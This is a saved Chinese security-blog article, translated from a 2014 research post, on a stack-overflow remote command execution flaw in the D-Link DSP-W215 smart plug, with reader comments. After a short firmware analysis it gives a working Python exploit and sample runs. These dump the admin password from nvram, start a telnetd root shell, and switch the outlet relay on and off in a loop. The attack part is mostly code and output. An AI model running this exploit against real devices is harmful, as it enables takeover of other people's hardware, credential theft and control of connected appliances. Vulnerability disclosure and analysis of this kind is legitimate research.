@@ -1,0 +1,99 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">D-LinkDSP-W215智能插座远程命令执行</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">livers</a> <span class="bull">·</span> <time title="2014/05/20 13:19" ui-time="" datetime="2014/05/20 13:19" class="published ng-binding ng-isolate-scope">2014/05/20 13:19</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>D-Link DSP-W215 智能插座是一款通过无线控制电源开关的插座。现在还不能从亚马逊和百思买买到，但是固件可以从D-Link网站下载（真蛋疼）。</p><p>DSP-W215存在一个堆栈溢出漏洞，通过该漏洞可以控制整个插座设备，也能控制插座设备上其他电器设备的开关。</p><h2>0x01 分析</h2><hr><p>分析插座的固件：</p><p><img alt="enter image description here" img-src="a281455f4b4ad43f6196e93896227f58ee5d5f24.jpg"></p><p>Lzma 压缩，linux文件系统，uimage 内核压缩镜像。</p><p>解压检查文件的内容，发现没有基于web的管理界面，只能用它提供的Android 或者IOS应用进行管理，该应用使用了HNAP（家庭网络管理协议）。</p><p>HNAP是基于soap 协议，其req/res如下：</p><p><img alt="enter image description here" img-src="b64beed2d157d9183ba104e37194ceb6d578d737.jpg"></p><p>更多查看<a href="http://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf">http://www.cisco.com/web/partners/downloads/guest/hnap_protocol_whitepaper.pdf</a></p><p>这个智能插座用lighttpd轻量级服务器来实现HNAP协议的传输，从lighttpd的配置上看，HNAP请求都发送到了<code>/www/my_cgi.cgi</code>进行处理。</p><pre><code>#!bash
+...
+alias.url += ( "/HNAP1/" =&gt; "/www/my_cgi.cgi",
+               "/HNAP1"  =&gt; "/www/my_cgi.cgi",
+...
+</code></pre><p>HNAP虽然是需要进行认证的协议，但是某些行为是不需要的，如获取设备信息设置之类。</p><p><img alt="enter image description here" img-src="f9f68604ed297c6faf0b9693d55488437e909f82.jpg"></p><p>HNAP请求数据是由在my_cgi.cgi的do_hnap函数处理。do_hnap会首先处理POST请求中指定的Content-Length头。</p><p><img alt="enter image description here" img-src="eab5083ed3f2d2e86eb37a26ed3d769b06c28f7d.jpg"></p><p>转换长度（str）为int.</p><p>然后，它读取上述长度字节的数据放入一个分配了固定大小的栈中。（500,000字节）</p><p><img alt="enter image description here" img-src="7a0887cd22697862882173151f9e8d6dd328acd7.jpg"></p><p>F5转换成c代码为：</p><pre><code>#!cpp
+int content_length, i;
+char *content_length_str;
+char post_data_buf[500000];
+
+content_length = 0;
+content_length_str = getenv("CONTENT_LENGTH");
+
+if(content_length_str)
+{
+   content_length = strtol(content_length_str, 10);
+}
+
+memset(post_data_buf, 0, 500000);
+
+for(i=0; i&lt;content_length; i++)
+{
+   post_data_buf[i] = fgetc();
+}
+</code></pre><p>明显未对content_length进行检查，可以写入大于500,000字节的数据进行溢出，但是栈里不止包含post_data_buf这个数组，所以需要1,000,020 进行溢出。</p><pre><code>#!bash
+perl -e 'print "D"x1000020; print "A"x4' &gt; overflow.txt
+wget --post-file=overflow.txt http://192.168.0.60/HNAP1/
+</code></pre><p><img alt="enter image description here" img-src="afe2fe6d33f0fbf68165a71eae3a64f0593397f0.jpg"></p><p>Arm寄存器真蛋疼。</p><p>由于是getc获取的数据，所以可以传入空字节。作者测试自己my_cgi.cgi进程中执行system地址0x00405CAC需要读入空字节。</p><p><img alt="enter image description here" img-src="915721c5f3e5120260f566aecef11a85021967e5.jpg"></p><p>所以 ，只需要把返回地址覆盖成0x00405CAC，并把栈的偏移28位处加入需要执行的指令代码。</p><h2>0x02 EXP</h2><hr><pre><code>#!python
+import sys
+import urllib2
+
+command = sys.argv[1]
+
+buf =  "D" * 1000020         # Fill up the stack buffer
+buf += "\x00\x40\x5C\xAC"    # Overwrite the return address on the stack
+buf += "E" * 0x28            # Stack filler
+buf += command               # Command to execute
+buf += "\x00"                # NULL terminate the command string
+
+req = urllib2.Request("http://192.168.0.60/HNAP1/", buf)
+print urllib2.urlopen(req).read()
+</code></pre><p>执行后得到的数据：</p><pre><code>#!bash
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="aacfdccfeacfdccf">[email&#160;protected]</a>:~$ ./exploit.py 'ls -l /'
+drwxr-xr-x    2 1000     1000         4096 Jan 14 14:16 bin
+drwxrwxr-x    3 1000     1000         4096 May  9 16:04 dev
+drwxrwxr-x    3 1000     1000         4096 Sep  3  2010 etc
+drwxrwxr-x    3 1000     1000         4096 Jan 14 14:16 lib
+drwxr-xr-x    3 1000     1000         4096 Jan 14 14:16 libexec
+lrwxrwxrwx    1 1000     1000           11 May  9 16:01 linuxrc -&gt; bin/busybox
+drwxrwxr-x    2 1000     1000         4096 Nov 11  2008 lost+found
+drwxrwxr-x    7 1000     1000         4096 May  9 15:44 mnt
+drwxr-xr-x    2 1000     1000         4096 Jan 14 14:16 mydlink
+drwxrwxr-x    2 1000     1000         4096 Nov 11  2008 proc
+drwxrwxr-x    2 1000     1000         4096 May  9 17:49 root
+drwxr-xr-x    2 1000     1000         4096 Jan 14 14:16 sbin
+drwxrwxr-x    3 1000     1000         4096 May 15 04:27 tmp
+drwxrwxr-x    7 1000     1000         4096 Jan 14 14:16 usr
+drwxrwxr-x    3 1000     1000         4096 May  9 16:04 var
+-rw-r--r--    1 1000     1000           17 Jan 14 14:16 version
+drwxrwxr-x    8 1000     1000         4096 May  9 16:52 www
+</code></pre><p>也可以直接dump配置：</p><pre><code>#!bash
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5336253613362536">[email&#160;protected]</a>:~$ ./exploit.py 'nvram show' | grep admin
+admin_user_pwd=200416
+admin_user_tbl=0/admin_user_name/admin_user_pwd/admin_level
+admin_level=1
+admin_user_name=admin
+storage_user_00=0/admin//
+</code></pre><p>或通过开启telnet得到一个shell</p><pre><code>#!bash
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0e6b786b4e6b786b">[email&#160;protected]</a>:~$ ./exploit.py 'busybox telnetd -l /bin/sh'
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4d283b280d283b28">[email&#160;protected]</a>:~$ telnet 192.168.0.60
+Trying 192.168.0.60...
+Connected to 192.168.0.60.
+Escape character is '^]'.
+
+
+BusyBox v1.01 (2014.01.14-12:12+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+/ #
+</code></pre><p>打开开关 关闭开关</p><pre><code>#!bash
+/var/sbin/relay 1   # Turns outlet on
+/var/sbin/relay 0   # Turns outlet off
+</code></pre><p>作者还搞了个让灯闪烁的脚本：</p><pre><code>#!bash
+#!/bin/sh
+
+OOK=1
+
+while [ 1 ]
+do
+   /var/bin/relay $OOK
+
+   if [ $OOK -eq 1 ]
+   then
+      OOK=0
+   else
+      OOK=1
+   fi
+done
+</code></pre><p>D-Link’s DIR-505L也存在这个漏洞。</p><p>from:http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2014-05-31 03:26:56</span></div><p></p><p>不都这样么，比如作者插入了段perl<br>perl -e 'print "D"x1000020; print "A"x4'</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-05-21 10:31:04</span></div><p></p><p>这个有意思，能影响到整个社区电力就可以请去被喝茶啦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Z-0ne</span> <span class="reply-time">2014-05-21 09:17:27</span></div><p></p><p>mark 很赞~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-05-20 23:21:37</span></div><p></p><p>可以控制电压吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-05-20 21:55:11</span></div><p></p><p>Python 字符串乘法的优点，终于看到了<br>这么用的啊！溢出必备啊！！<br>buf = "D" * 1000020 # Fill up the stack buffer</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-05-20 19:25:58</span></div><p></p><p>有意思啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2014-05-20 16:31:02</span></div><p></p><p>xml每次看得头痛，有没有啥软件可以排成好看的格式，另外，楼主硬件牛，受我一拜！</p><p></p></div></div></div></div></div></main>
